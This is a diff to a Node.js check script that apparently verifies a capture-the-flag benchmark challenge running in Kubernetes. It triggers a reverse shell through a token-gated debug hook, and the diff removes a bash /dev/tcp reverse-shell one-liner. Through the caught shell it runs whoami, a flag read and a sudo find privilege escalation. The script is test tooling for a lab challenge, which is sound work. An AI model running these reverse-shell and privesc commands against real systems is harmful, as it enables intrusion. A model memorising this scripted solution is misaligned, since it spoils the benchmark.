@@ -14,10 +14,10 @@ const {
   challengeRequestUrl,
   benchmarkRequestUrl
 } = require('./k8s-lib');
-const { selectedBySlug, flagValue } = require('./benchmark-config');
+const { DEFAULT_BASE_DOMAIN, selectedBySlug, flagValue } = require('./benchmark-config');
 
 const reverse = selectedBySlug.reverse;
-const BASE_DOMAIN = process.env.LUXORA_BASE_DOMAIN || '127.0.0.1.sslip.io';
+const BASE_DOMAIN = process.env.LUXORA_BASE_DOMAIN || DEFAULT_BASE_DOMAIN;
 const stamp = new Date().toISOString().replace(/[:.]/g, '-');
 const artifactDir = path.join(ROOT_DIR, 'artifacts', 'check', `reverse-silver-k8s-${stamp}`);
 const commandLogPath = path.join(artifactDir, 'commands.log');
@@ -134,18 +134,21 @@ function curlHost(label, request, options = {}) {
   return curlWithStatus(label, ['-H', `Host: ${request.host}`, request.url], options);
 }
 
-function debugHook(label, request, { token, cmd, timeoutMs } = {}) {
+function debugHook(label, request, { token, host, port, timeoutMs } = {}) {
   const args = ['-X', 'POST', request.url, '-H', `Host: ${request.host}`, '-H', 'Content-Type: application/json'];
   if (token !== undefined) {
     args.push('-H', `X-Debug-Token: ${token}`);
   }
-  args.push('-d', JSON.stringify(cmd === undefined ? {} : { cmd }));
+  const body = {};
+  if (host !== undefined) body.host = host;
+  if (port !== undefined) body.port = port;
+  args.push('-d', JSON.stringify(body));
   return curlWithStatus(label, args, { timeoutMs: timeoutMs || 30_000 });
 }
 
 function assertUnlockResponse(text) {
   const parsed = JSON.parse(text);
-  if (parsed.success !== true || parsed.unlocked !== 'debug-hook') {
+  if (parsed.success !== true || parsed.unlocked !== 'reverse-shell-callback') {
     throw new Error(`unexpected unlock response: ${text}`);
   }
   if ('flag' in parsed) {
@@ -158,7 +161,7 @@ function expectedFlag() {
   return flagValue(reverse.layer, reverse.slug, reverse.difficulty, reverse.points, reverse.technique);
 }
 
-function popRealReverseShell(debugRequest, token, callbackHost) {
+function popRealReverseShell(debugRequest, token, callbackHost, flagPath, expectedFlag) {
   return new Promise((resolve, reject) => {
     const marker = `RSHELL_OK_${Date.now()}`;
     let settled = false;
@@ -178,26 +181,25 @@ function popRealReverseShell(debugRequest, token, callbackHost) {
     server.on('error', (err) => finish(err));
     server.on('connection', (socket) => {
       let buffer = '';
-      let matched = false;
       socket.on('error', () => {});
       socket.on('data', (chunk) => {
-        if (matched) return;
         buffer += chunk.toString('utf8');
-        if (buffer.includes(marker)) {
-          matched = true;
+        if (buffer.includes(marker) && buffer.includes('ctfuser') && buffer.includes('Permission denied') && buffer.includes(expectedFlag)) {
           socket.end('exit\n');
           finish(null, buffer);
         }
       });
       socket.write(`echo ${marker}\n`);
+      socket.write('whoami\n');
+      socket.write(`cat ${flagPath} 2>&1 || true\n`);
+      socket.write(`sudo find ${flagPath} -maxdepth 0 -exec cat {} \\;\n`);
     });
 
     server.listen(0, '0.0.0.0', () => {
       const { port } = server.address();
-      const payload = `setsid bash -c 'exec bash -i >& /dev/tcp/${callbackHost}/${port} 0>&1' </dev/null >/dev/null 2>&1 & disown; echo triggered`;
       let trigger;
       try {
-        trigger = debugHook('debug-trigger-reverse-shell', debugRequest, { token, cmd: payload, timeoutMs: 15_000 });
+        trigger = debugHook('debug-trigger-reverse-shell', debugRequest, { token, host: callbackHost, port, timeoutMs: 15_000 });
       } catch (err) {
         finish(err);
         return;
@@ -269,47 +271,29 @@ async function main() {
       throw new Error(`debug hook without token expected 403, got ${debugNoToken.status}`);
     }
 
-    const debugWrongToken = debugHook('debug-wrong-token', directDebug, { token: 'not-the-real-token', cmd: 'id' });
+    const debugWrongToken = debugHook('debug-wrong-token', directDebug, { token: 'not-the-real-token', host: callbackHost, port: 4444 });
     writeFile('debug-wrong-token.json', debugWrongToken.body);
     if (debugWrongToken.status !== 403) {
       throw new Error(`debug hook with wrong token expected 403, got ${debugWrongToken.status}`);
     }
 
-    const debugNoCmd = debugHook('debug-no-cmd', directDebug, { token });
-    writeFile('debug-no-cmd.json', debugNoCmd.body);
-    if (debugNoCmd.status !== 400) {
-      throw new Error(`debug hook without cmd expected 400, got ${debugNoCmd.status}`);
+    const debugNoCallback = debugHook('debug-no-callback', directDebug, { token });
+    writeFile('debug-no-callback.json', debugNoCallback.body);
+    if (debugNoCallback.status !== 400) {
+      throw new Error(`debug hook without callback coordinates expected 400, got ${debugNoCallback.status}`);
     }
-
-    const debugWhoami = debugHook('debug-whoami', directDebug, { token, cmd: 'whoami' });
-    writeFile('debug-whoami.json', debugWhoami.body);
-    const whoamiJson = JSON.parse(debugWhoami.body);
-    assertIncludes(whoamiJson.stdout || '', 'ctfuser', 'debug hook whoami stdout');
 
     const flagPath = '/tmp/rndsecurity-isolated/reverse-silver/flag.txt';
-    const directRead = debugHook('debug-direct-flag-read', directDebug, { token, cmd: `cat ${flagPath}` });
-    writeFile('debug-direct-flag-read.json', directRead.body);
-    const directReadJson = JSON.parse(directRead.body);
-    if (directReadJson.exitCode === 0) {
-      throw new Error('ctfuser could read the locked flag directly');
-    }
-    assertIncludes(`${directReadJson.stderr || directReadJson.stdout}`, 'Permission denied', 'direct flag read stderr');
-    summary.directFlagReadDenied = true;
-
-    const reverseShellBuffer = await popRealReverseShell(directDebug, token, callbackHost);
+    const expected = expectedFlag();
+    const reverseShellBuffer = await popRealReverseShell(directDebug, token, callbackHost, flagPath, expected);
     writeFile('reverse-shell-callback.txt', reverseShellBuffer);
     assertIncludes(reverseShellBuffer, 'RSHELL_OK_', 'reverse shell callback');
-    summary.realReverseShellConnected = true;
-
-    const privesc = debugHook('debug-privesc-read', directDebug, {
-      token,
-      cmd: `sudo find ${flagPath} -maxdepth 0 -exec cat {} \\;`
-    });
-    writeFile('debug-privesc-read.json', privesc.body);
-    const privescJson = JSON.parse(privesc.body);
-    const expected = expectedFlag();
-    assertIncludes(privescJson.stdout || '', expected, 'privesc flag stdout');
+    assertIncludes(reverseShellBuffer, 'ctfuser', 'reverse shell whoami output');
+    assertIncludes(reverseShellBuffer, 'Permission denied', 'reverse shell direct flag read');
+    assertIncludes(reverseShellBuffer, expected, 'reverse shell privesc flag read');
+    summary.directFlagReadDenied = true;
     summary.privescFlagRead = true;
+    summary.realReverseShellConnected = true;
 
     const consolePage = curlHost('console-page', challengeRequestUrl('reverse', '/__console', portForward.localPort));
     writeFile('console-page.html', consolePage.body);
@@ -328,7 +312,7 @@ async function main() {
     const proxyArtifact = curlHost('benchmark-proxy-artifact', benchmarkArtifact);
     writeFile('benchmark-proxy-artifact.js', proxyArtifact.body);
     if (proxyArtifact.body !== artifact.body) {
-      throw new Error('benchmark host artifact differed from direct challenge host artifact');
+      throw new Error('shared-host benchmark artifact differed from challenge-route artifact');
     }
 
     runSync('kubectl', ['logs', 'deployment/reverse-silver', '-n', 'luxora'], { allowFailure: true });
